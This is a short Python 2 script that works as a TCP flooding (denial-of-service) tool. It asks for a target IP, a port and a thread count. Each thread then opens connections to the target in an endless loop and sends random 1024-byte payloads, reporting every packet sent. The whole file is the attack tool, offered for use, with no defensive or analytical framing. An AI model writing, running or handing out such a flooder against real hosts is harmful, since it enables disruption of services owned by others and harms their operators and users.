import threading
import socket
import random
import time

print (" ")
ip = raw_input("\033[93m [+] IP : \033[2m")
port = input("\033[94m [+] Port : \033[0m")
thread_num = input("\033[95m [+] Threads : \033[0m")
print (" ")
print "\033[91m [!] Please Wait While Packages Are Preparing Thread : \033[0m",thread_num
time.sleep(5)

def run():
	bytes = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((str(ip),int(port))) 
			s.send(bytes)
			print "\033[92m [+] Package Sent ! \033[0m"
		except:
			s.close()
			print "\033[91m [!] Error , Socket Closed \033[0m"
			
for i in range(thread_num):
    th = threading.Thread(target = run)
    th.start()
